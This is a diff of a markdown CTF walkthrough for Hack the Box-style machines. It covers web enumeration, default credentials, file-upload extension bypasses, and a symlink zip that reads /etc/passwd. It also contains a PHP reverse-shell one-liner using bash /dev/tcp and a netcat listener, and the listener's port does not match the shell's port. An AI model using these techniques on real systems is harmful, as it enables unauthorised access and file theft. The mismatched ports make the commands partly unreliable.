@@ -1,6 +1,8 @@
 ## Introduction
 In hack the box, root-me and similar war-game like challenges that are security related, we often follow an identical pattern when trying to get a certain flag from the so called "boxes".
+
 In this article, I will try to outline this pattern in what I would like to call a ctf mold, or a typical ctf walkthrough.
+
 In this article, we consider that we are connected to the vpn that allows us to interact with the victim machine. This victim machine will have the following ip address : 10.13.37.10
 
 Please double check that you are connected to the vpn before starting.
@@ -29,7 +31,9 @@ A first step would be to search for any vulnerabilities in these services for th
 
 ## HTTP
 The first step is to access the following url: http://10.13.37.10:80
+
 If it resolves into a domain name, say for example: `http://sowon.mold`, it will have to be added to our /etc/hosts file.
+
 To do so, we execute the following:
 ```bash
 $ sudo echo '10.13.37.10 sowon.mold' >> /etc/hosts
@@ -39,14 +43,17 @@ Once in the webpage, check all pages and look for webpages that are of interest:
 ### Login Page
 The first step is to look for credentials in source code, if none are found look for default credentials online, otherwise use burp to bruteforce for default credentials.
 
-If the website is based on a known ticket management system, a content management system or similar, google for possible default credentials and try them, or for possible past vulnerable versions.
-: Examples of default credentials are: admin/admin, user/password, root/password etc...
+If the website is based on a known ticket management system, a content management system or similar, look online for possible default credentials and try them, or for possible past vulnerable versions.
+
+:Examples of default credentials are: admin/admin, user/password, root/password etc...
 
 ### File upload page
 When a webpage allows file upload, an attacker can upload a file containing malicious code and run it.
+
 Some of these webpages are protected by black-listing some extensions but that can easily be bypassed. Some techniques include doubling extensions "file.png.php" or adding null-bytes "file.php%00.png"
 
 When we can upload files, always think of reverse shells php that can be submitted.
+
 You can also use ready-to-use ones like the ones found here: https://pentestmonkey.net/tools/web-shells/php-reverse-shell
 
 #### php code for reverse shell
@@ -56,34 +63,40 @@ An example of php code that can be injected to retrieve a reverse shell on port 
 system('bash -c "bash -i >& /dev/tcp/10.13.37.10/9001 0>&1"');
 php>
 ```
+
 N.B.: make sure you have ran the following command beforehand, to have an active listener on your machine for any incoming connections:
 ```bash
 $ nc -nvlp 9991
 ```
 #### Zip file upload
 In some cases, the security measure in place is a white-listing of certain files. One example that I encountered is a webpage that asks specifically for a pdf file in a zip file. In this case, I used symlinks.
+
 The following command creates a link to the file "../../../../../../etc/passwd" and names that link as "document.pdf"
 ```bash
 $ ln -s ../../../../../../etc/passwd document.pdf
 ```
+
 The next command creates a symlink zip that will be uploaded.
 ```bash
 $ zip --symlinks doc.zip document.pdf
 ```
+
 After uploading, the webpage provides the url of the file location.
+
 By inspecting the Network exchange we get a base64 response (stored in "responsebase64characters") that is then deciphered using the following:
 ```bash
 $ echo responsebase64characters | base64 -d
 ```
 
 ### Known CMS (Content Management System)
-The first thing to do is to google for known vuulnerabilities and exploits. To do that we can google "name_of_CMS_version CVE exploit".
+The first thing to do is to search online for known vuulnerabilities and exploits. To do that we can search for "name_of_CMS used_version CVE exploit".
 
 #### Joomla CMS
 When a Joomla CMS based website is encountered, joomscan is a very useful tool that can help us get a lot of information, including credentials that may be used later for privilege escalation.
 
 ### Brute-force enumeration of directories and files
 This is a technique that uses known wordlists to brute-force for files and directories hosted in the webserver and that aren't directly accessible by the user from the previous webpage.
+
 These are some commands that help do that:
 ```bash
 $ dirb http://sowon.mold
@@ -94,6 +107,7 @@ $ dirsearch -u http://sowon.mold
 ```bash
 $ gobuster todo!
 ```
+
 We can also check for virtual hosts, which are directories and files that are hosted in virtual environments and have a different DNS subdomain:
 ```bash
 $ gobuster vhost -u sowon.mold -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
@@ -161,6 +175,7 @@ The output is all the commands and scripts that the current user can run as sudo
 
 ## Windows box
 Sometimes we encounter Windows boxes instead of Linux-based ones.
+
 The initial step is the same: a discovery using nmap.
 
 ### SMB : 
